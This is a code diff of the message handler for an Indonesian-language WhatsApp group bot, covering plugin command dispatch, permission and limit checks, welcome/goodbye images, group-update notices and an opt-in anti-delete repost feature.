+
+        const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch(() => ({})) : {}
+        const participants = m.isGroup ?(groupMetadata.participants || []) : []
+        
+let userIds = await conn.findUserId(m.sender).catch(() => ({}))
+let botIds = await conn.findUserId(conn.user.id).catch(() => ({}))
+
+const idsUser = [
+  userIds?.phoneNumber,
+  userIds?.lid
+].filter(v => v && v !== 'id-not-found')
+
+const idsBot = [
+  botIds?.phoneNumber,
+  botIds?.lid
+].filter(v => v && v !== 'id-not-found')
+
+const groupUser = m.isGroup
+  ? participants.find(u => idsUser.includes(u.id))
+  : {}
+
+const bot = m.isGroup
+  ? participants.find(u => idsBot.includes(u.id))
+  : {}
+
+const isRAdmin = groupUser?.admin === 'superadmin'
+const isAdmin = isRAdmin || groupUser?.admin === 'admin'
+const isBotAdmin = ['admin', 'superadmin'].includes(bot?.admin)
+
+        const ___dirname = path.join(path.dirname(fileURLToPath(import.meta.url)), './plugins')
+
+        let user = global.db.data.users[m.sender]
+/*
+if (user && user.name && !user.registered) {
+    user.registered = true
+}
+*/
+
+for (let name in global.plugins) {
+    let plugin = global.plugins[name]
+    if (!plugin || plugin.disabled) continue
+
+    let chat = global.db.data.chats[m.chat]
+
+    if (chat?.isBanned) {
+        if (!name.endsWith('owner/unbanchat.js')) continue
+    }
+            
+            const __filename = join(___dirname, name)
+            if (typeof plugin.all === 'function') {
+                try {
+                    await plugin.all.call(this, m, { chatUpdate, __dirname: ___dirname, __filename })
+                } catch (e) {
+                    console.error(e)
                 }
             }
 
-            // Flag tambahan yang dipakai plugin adaptasi dari base lain
-            if (handler.group && !m.isGroup) {
-                await notifReply('Perintah ini hanya bisa dipakai di dalam grup.', 'Khusus Grup')
-                return true
-            }
-            if (handler.private && m.isGroup) {
-                await notifReply('Perintah ini hanya bisa dipakai di chat pribadi.', 'Khusus Chat Pribadi')
-                return true
-            }
-            if (handler.admin && !(await isAdmin(conn, m))) {
-                await notifReply('Perintah ini hanya untuk admin grup.', 'Access Denied')
-                return true
-            }
-            if (handler.botAdmin && m.isGroup && !(await isBotAdmin(conn, m))) {
-                await notifReply('Jadikan bot admin grup dulu supaya perintah ini bisa dipakai.', 'Bot Bukan Admin')
-                return true
+            if (opts['restrict']) if (plugin.tags && plugin.tags.includes('admin')) continue
+
+            const str2Regex = str => str.replace(/[|\\{}()[\]^$+*?.]/g, '\\$&')
+            let _prefix = plugin.customPrefix ? plugin.customPrefix : conn.prefix ? conn.prefix : global.prefix
+            let match = (_prefix instanceof RegExp ? [[_prefix.exec(m.text), _prefix]] :
+                Array.isArray(_prefix) ? _prefix.map(p => {
+                    let re = p instanceof RegExp ? p : new RegExp(str2Regex(p))
+                    return [re.exec(m.text), re]
+                }) :
+                typeof _prefix === 'string' ? [[new RegExp(str2Regex(_prefix)).exec(m.text), new RegExp(str2Regex(_prefix))]] :
+                [[[], new RegExp]]
+            ).find(p => p[1])
+
+            if (typeof plugin.before === 'function') {
+                if (await plugin.before.call(this, m, {
+                    match, conn: this, participants, groupMetadata, user, bot,
+                    isROwner, isOwner, isRAdmin, isAdmin, isBotAdmin, isPrems, chatUpdate, __dirname: ___dirname, __filename
+                })) continue
             }
 
-            return false
-        }
+            if (typeof plugin !== 'function') continue
+            
+                    let usedPrefix
+        if ((usedPrefix = (match[0] || '')[0])) {
+            let noPrefix = m.text.replace(usedPrefix, '')
+            let [command, ...args] = noPrefix.trim().split` `.filter(v => v)
+        
+            args = args || []
+            let _args = noPrefix.trim().split` `.slice(1)
+            let text = _args.join` `
+        
+            if (m.mentionedJid?.length && /^@/.test(text)) {
+                try {
+                    text = await conn.getName(m.mentionedJid[0])
+                } catch {}
+            }
+        
+            command = (command || '').toLowerCase()
+                let fail = plugin.fail || global.dfail
 
-        if (isButtonResponse) {
-            let bodyText = body
-            const prefixes = config.prefix || ['.']
-            for (const p of prefixes) {
-                if (bodyText.startsWith(p)) {
-                    bodyText = bodyText.slice(p.length)
-                    break
+                let isAccept = plugin.command instanceof RegExp ? plugin.command.test(command) :
+                    Array.isArray(plugin.command) ? plugin.command.some(cmd => cmd instanceof RegExp ? cmd.test(command) : cmd === command) :
+                    typeof plugin.command === 'string' ? plugin.command === command : false
+
+                if (!isAccept) continue
+                
+                m.plugin = name
+                let chat = global.db.data.chats[m.chat]
+                
+                if (plugin.rpg && m.isGroup && !chat?.rpgs) {
+                    m.reply('🎮 Mode RPG di grup ini belum aktif\n\nKetik:\n.enable rpg')
+                    continue
                 }
-            }
-            const args = bodyText.trim().split(/\s+/)
-            const command = args.shift().toLowerCase()
-            const handler = plugins.get(command)
-            if (!handler) return
-            if (await checkAccess(handler)) return
-            return await handler(m, context({
-                args, text: args.join(' '),
-                command, prefix: ''
-            }))
-        }
 
-        const hasConfigPrefix = (config.prefix || ['.']).some(p => m.text.startsWith(p))
+                if (chat?.isBanned && !isOwner) return 
+                if (user?.banned && !isOwner) return
 
-        if (!hasConfigPrefix) {
-            let matchedHandler = null
-            for (const handler of plugins.values()) {
-                if (!handler.customPrefix) continue
-                if (!handler.customPrefix.source.startsWith('^')) continue
-                if (!handler.customPrefix.test(m.text)) continue
-                matchedHandler = handler
+                if (plugin.rowner && !isROwner) { fail('rowner', m, this); continue }
+                if (plugin.owner && !isOwner) { fail('owner', m, this); continue }
+                if (plugin.mods && !isMods) { fail('mods', m, this); continue }
+                if (plugin.premium && !isPrems) { fail('premium', m, this); continue }
+                if (plugin.group && !m.isGroup) { fail('group', m, this); continue }
+                if (plugin.botAdmin && !isBotAdmin) { fail('botAdmin', m, this); continue }
+                if (plugin.admin && !isAdmin) { fail('admin', m, this); continue }
+                if (plugin.private && m.isGroup) { fail('private', m, this); continue }
+                if (plugin.register && !user.registered) { fail('unreg', m, this); continue }
+
+                m.isCommand = true
+                let xp = 'exp' in plugin ? parseInt(plugin.exp) : 17
+                if (xp < 200 && user?.autolevelup) m.exp += xp
+
+                if (!isPrems && plugin.limit && user.limit < plugin.limit * 1) {
+                    this.reply(m.chat, `[❗] Limit harian kamu telah habis`, m)
+                    continue 
+                }
+                
+                if (plugin.level > user.level) {
+                    this.reply(m.chat, `[💬] Diperlukan level ${plugin.level} untuk perintah ini\n*Level mu:* ${user.level} 📊`, m)
+                    continue 
+                }
+
+                let extra = {
+    match, usedPrefix, noPrefix, _args, args, command, text, conn: this,
+    participants, groupMetadata, user, bot,
+    isROwner, isOwner, isRAdmin, isAdmin,
+    isBotAdmin, isPrems,
+    senderPN: m.senderPN,
+    chatUpdate, __dirname: ___dirname, __filename
+                }
+
+                try {
+                    await plugin.call(this, m, extra)
+                    if (!isPrems) m.limit = m.limit || plugin.limit || false
+                } catch (e) {
+                    m.error = e
+                    console.error(e)
+                    if (e) {
+                        let text = format(e)
+                        m.reply(`*Error:* ${text}`)
+                    }
+                } finally {
+                    if (typeof plugin.after === 'function') {
+                        try {
+                            await plugin.after.call(this, m, extra)
+                        } catch (e) {
+                            console.error(e)
+                        }
+                    }
+                    if (m.limit) m.reply(+m.limit + ' Limit terpakai')
+                }
                 break
             }
-
-            if (!matchedHandler) {
-                for (const handler of plugins.values()) {
-                    if (!handler.customPrefix) continue
-                    if (handler.customPrefix.source.startsWith('^')) continue
-                    if (!handler.customPrefix.test(m.text)) continue
-                    matchedHandler = handler
-                    break
-                }
-            }
-
-            if (matchedHandler) {
-                if (await checkAccess(matchedHandler)) return
-                return await matchedHandler(m, context({
-                    args: [],
-                    text: m.text,
-                    command: '',
-                    prefix: ''
-                }))
-            }
         }
-
-        let prefix = ''
-        let command = ''
-        let args = []
-
-        if (hasConfigPrefix) {
-            prefix = (config.prefix || ['.']).find(p => m.text.startsWith(p))
-            const body2 = m.text.slice(prefix.length).trim()
-            if (!body2) return
-            const parts = body2.split(/\s+/)
-            command = parts.shift().toLowerCase()
-            args = parts
-        } else {
-            const trimmed = m.text.trim()
-            if (/\s/.test(trimmed)) return
-            command = trimmed.toLowerCase()
-            args = []
-        }
-
-        const handler = plugins.get(command)
-        if (!handler) return
-        if (await checkAccess(handler)) return
-
-        await handler(m, context({
-            args,
-            text: args.join(' '),
-            command, prefix
-        }))
     } catch (e) {
-        // Plugin hasil adaptasi sering memakai `throw 'teks'` untuk pesan ke pengguna.
-        // Teks seperti itu ditampilkan sebagai pesan biasa, bukan dianggap crash.
-        if (typeof e === 'string' && e.trim()) {
-            try {
-                const config = readJSON(configPath)
-                await conn.sendMessage(m.chat, { text: card(config.botName, e.trim()) }, { quoted: m })
-            } catch (inner) {
-                console.error(inner)
-            }
-            return
+        console.error(e)
+    } finally {
+        
+        let user = global.db.data.users[m.sender]
+        
+        if (user && global.db.data.chats[m.chat]?.autolevelup) {
+            user.exp += (m.exp || 0)
         }
+        
+        if (user && m.limit) user.limit -= (m.limit * 1)
+        
+        await global.db.write?.()
+
+    try {
+        if (!opts['noprint']) await (await import(`./lib/print.js`)).default(m, this)
+    } catch (e) {
+        console.log(e)
+    }
+    if (opts['autoread']) await conn.readMessages([m.key])
+}
+}
+
+export async function participantsUpdate({ id, participants, action }) {
+    installOutgoingSanitizer(this)
+    if (opts['self'] || this.isInit) return
+    if (global.db.data == null) await global.loadDatabase()
+
+    let chat = global.db.data.chats[id]
+    if (!chat || !chat.welcome) return
+
+    let groupMetadata = await this.groupMetadata(id).catch(() => null)
+    if (!groupMetadata || !groupMetadata.subject) {
+        groupMetadata = this.chats?.[id] || {}
+    }
+
+    let groupName = groupMetadata.subject || groupMetadata.name || id.split('@')[0]
+    let memberCount = groupMetadata.participants?.length || 0
+
+    for (let userObj of participants) {
+        let user = typeof userObj === 'object'
+            ? (userObj.phoneNumber || userObj.id || userObj.lid || '')
+            : userObj
+
+        let ids = await this.findUserId(user).catch(() => null)
+
+        let displayName =
+            global.nameCache?.[ids?.lid] ||
+            global.nameCache?.[user] ||
+            global.nameCache?.[ids?.phoneNumber] ||
+            this.getName(user) ||
+            user.split('@')[0]
+
+        let pp = 'https://i.ibb.co/1s8T3sY/48f7ce63c7aa.jpg'
+        try {
+            pp = await this.profilePictureUrl(user, 'image')
+        } catch {}
+
+        let text = ''
+
+        // ================= WELCOME =================
+        if (action === 'add') {
+            text = chat.sWelcome?.trim()
+                ? chat.sWelcome
+                : `👋 Halo ${displayName}!\n\nSelamat datang di *${groupName}* ✨`
+        }
+
+        // ================= GOODBYE =================
+        if (action === 'remove') {
+            text = chat.sBye?.trim()
+                ? chat.sBye
+                : `✨ Sayonara ${displayName}`
+        }
+
+        // ================= PROMOTE =================
+        if (action === 'promote') {
+            text = (chat.sPromote || this.spromote || '@user Sekarang jadi admin!')
+                .replace('@user', displayName)
+
+            await this.sendMessage(id, { text })
+            continue
+        }
+
+        // ================= DEMOTE =================
+        if (action === 'demote') {
+            text = (chat.sDemote || this.sdemote || '@user Sekarang bukan lagi admin!')
+                .replace('@user', displayName)
+
+            await this.sendMessage(id, { text })
+            continue
+        }
+
+        text = text
+            .replace('@user', displayName)
+            .replace('@subject', groupName)
+            .replace('@desc', groupMetadata.desc || '')
+
+        try {
+            const {
+                createWelcomeCanvas,
+                createGoodbyeCanvas
+            } = await import('./lib/welcomeCanvas.js')
+
+            let buf
+
+            if (action === 'add') {
+                buf = await createWelcomeCanvas({
+                    groupName,
+                    avatarUrl: pp,
+                    name: displayName,
+                    count: memberCount + 1
+                })
+            } else if (action === 'remove') {
+                buf = await createGoodbyeCanvas({
+                    groupName,
+                    avatarUrl: pp,
+                    name: displayName,
+                    count: memberCount
+                })
+            }
+
+            await this.sendMessage(id, {
+                image: buf,
+                caption: text
+            })
+        } catch (e) {
+            console.log('WELCOME ERROR:', e)
+            await this.sendMessage(id, { text })
+        }
+    }
+}
+export async function groupsUpdate(groupsUpdate) {
+    installOutgoingSanitizer(this)
+    if (opts['self']) return
+    for (const groupUpdate of groupsUpdate) {
+        const id = groupUpdate.id
+        if (!id) continue
+        let chats = global.db.data.chats[id], text = ''
+        if (!chats?.detect) continue
+        if (groupUpdate.desc) text = (chats.sDesc || this.sDesc || 'Deskripsi telah diubah menjadi \n@desc').replace('@desc', groupUpdate.desc)
+        if (groupUpdate.subject) text = (chats.sSubject || this.sSubject || 'Judul grup telah diubah menjadi \n@subject').replace('@subject', groupUpdate.subject)
+        if (groupUpdate.icon) text = (chats.sIcon || this.sIcon || 'Icon grup telah diubah!')
+        if (groupUpdate.revoke) text = (chats.sRevoke || this.sRevoke || 'Link group telah diubah ke \n@revoke').replace('@revoke', groupUpdate.revoke)
+        if (groupUpdate.announce == true) text = this.sAnnounceOn || 'Group telah di tutup!\nsekarang hanya admin yang dapat mengirim pesan.'
+        if (groupUpdate.announce == false) text = this.sAnnounceOff || 'Group telah di buka!\nsekarang semua peserta dapat mengirim pesan.'
+        if (groupUpdate.restrict == true) text = this.sRestrictOn || 'Edit Info Grup di ubah ke hanya admin!'
+        if (groupUpdate.restrict == false) text = this.sRestrictOff || 'Edit Info Grup di ubah ke semua peserta!'
+
+        if (!text) continue
+        this.reply(id, text.trim())
+    }
+}
+
+export async function deleteUpdate(message) {
+    try {
+        installOutgoingSanitizer(this)
+        const { fromMe, id, participant } = message
+        if (fromMe) return
+        let msg = this.serializeM(this.loadMessage(id))
+        if (!msg || !global.db.data.chats[msg.chat]?.delete) return
+
+        const who = (participant || msg.sender).split('@')[0]
+        await this.reply(msg.chat, `Terdeteksi @${who} telah menghapus pesan.`, msg, { mentions: [participant || msg.sender] })
+        await this.copyNForward(msg.chat, msg).catch(() => {})
+    } catch (e) {
         console.error(e)
     }
 }
 
-// Variabel global yang dipakai plugin hasil adaptasi (global.owner, global.namebot, dst.)
-try {
-    const config = readJSON(configPath)
-    const module = await import('./lib/ui.js')
-    installCompatGlobals({ config, identity: module.brand() })
-    installCompatPrototypes()
-} catch (e) {
-    console.error('Gagal menyiapkan kompatibilitas plugin:', e?.message || e)
+global.dfail = (type, m, conn) => {
+  const msg = {
+    rowner: '*`ᴅᴇᴠᴇʟᴏᴘᴇʀ ᴏɴʟʏ • ᴀᴋsᴇs ɪɴɪ ʜᴀɴʏᴀ ᴛᴇʀsᴇᴅɪᴀ ᴜɴᴛᴜᴋ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙᴏᴛ.`*',
+    owner: '*`ᴏᴡɴᴇʀ ᴏɴʟʏ • ᴀᴋsᴇs ɪɴɪ ʜᴀɴʏᴀ ᴛᴇʀsᴇᴅɪᴀ ᴜɴᴛᴜᴋ ᴏᴡɴᴇʀ ʙᴏᴛ.`*',
+    mods: '*`ᴍᴏᴅᴇʀᴀᴛᴏʀ ᴏɴʟʏ • ᴀᴋsᴇs ɪɴɪ ʜᴀɴʏᴀ ᴛᴇʀsᴇᴅɪᴀ ᴜɴᴛᴜᴋ ᴍᴏᴅᴇʀᴀᴛᴏʀ ʙᴏᴛ.`*',
+    premium: '*`ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ • ғɪᴛᴜʀ ɪɴɪ ᴋʜᴜsᴜs ᴜɴᴛᴜᴋ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ.`*',
+    group: '*`ɢʀᴏᴜᴘ ᴏɴʟʏ • ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ʜᴀɴʏᴀ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴅɪ ᴅᴀʟᴀᴍ ɢʀᴜᴘ.`*',
+    private: '*`ᴘʀɪᴠᴀᴛᴇ ᴏɴʟʏ • ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ʜᴀɴʏᴀ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴅɪ ᴄʜᴀᴛ ᴘʀɪʙᴀᴅɪ.`*',
+    admin: '*`ᴀᴅᴍɪɴ ᴏɴʟʏ • ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ʜᴀɴʏᴀ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴏʟᴇʜ ᴀᴅᴍɪɴ ɢʀᴜᴘ.`*',
+    botAdmin: '*`ʙᴏᴛ ᴀᴅᴍɪɴ ʀᴇǫᴜɪʀᴇᴅ • ᴊᴀᴅɪᴋᴀɴ ʙᴏᴛ sᴇʙᴀɢᴀɪ ᴀᴅᴍɪɴ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ.`*',
+    unreg: '*`ʀᴇɢɪsᴛʀᴀᴛɪᴏɴ ʀᴇǫᴜɪʀᴇᴅ • sɪʟᴀᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴘᴇʀɪɴᴛᴀʜ .ᴅᴀғᴛᴀʀ.`*',
+    restrict: '*`ʀᴇsᴛʀɪᴄᴛ ᴅɪsᴀʙʟᴇᴅ • ᴍᴏᴅᴇ ʀᴇsᴛʀɪᴄᴛ ʙᴇʟᴜᴍ ᴅɪᴀᴋᴛɪғᴋᴀɴ ᴅɪ ᴄʜᴀᴛ ɪɴɪ.`*'
+  }
+
+  if (msg[type]) return m.reply(msg[type])
 }
+let file = global.__filename(import.meta.url, true)
+watchFile(file, async () => {
+    unwatchFile(file)
+    console.log(chalk.redBright("Update 'handler.js'"))
+    if (global.reloadHandler) console.log(await global.reloadHandler())
+})
